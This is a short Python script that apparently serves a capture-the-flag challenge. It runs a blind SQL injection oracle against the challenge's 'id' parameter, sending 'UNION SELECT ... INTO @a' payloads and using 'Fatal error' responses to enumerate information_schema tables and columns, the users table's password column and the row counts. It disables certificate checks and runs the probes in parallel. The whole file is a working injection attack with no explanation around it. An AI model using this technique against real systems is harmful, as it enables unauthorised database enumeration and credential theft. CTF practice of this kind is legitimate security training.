import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()
url = "https://04a2b0dcb17c2e99.chal.ctf.ae/"

def oracle(cond):
    s = requests.Session()
    s.verify = False
    p = f"1 UNION SELECT 2 WHERE ({cond}) INTO @a"
    try:
        r = s.get(url, params={"id": p}, timeout=10)
        return "Fatal error" not in r.text
    except Exception as e:
        return False

tests = [
    ("any table like '%flag%'", "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%flag%')>0"),
    ("table 'flag' exists", "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='flag')>0"),
    ("table 'flags' exists", "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='flags')>0"),
    ("any column like '%flag%'", "(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%flag%')>0"),
    ("users col 'password' exists", "(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password')>0"),
    ("users col 'flag' exists", "(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='flag')>0"),
    ("users has rows where username LIKE 'pwnsec%'", "(SELECT COUNT(*) FROM users WHERE username LIKE 'pwnsec%')>0"),
    ("users row count > 0", "(SELECT COUNT(*) FROM users)>0"),
    ("users row count = 1", "(SELECT COUNT(*) FROM users)=1"),
    ("table count = 1", "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=1"),
    ("table count = 2", "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2"),
    ("table count = 3", "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=3"),
]

with ThreadPoolExecutor(max_workers=8) as ex:
    futures = [(name, ex.submit(oracle, cond)) for name, cond in tests]
    for name, f in futures:
        print(f"{name:45} : {f.result()}")
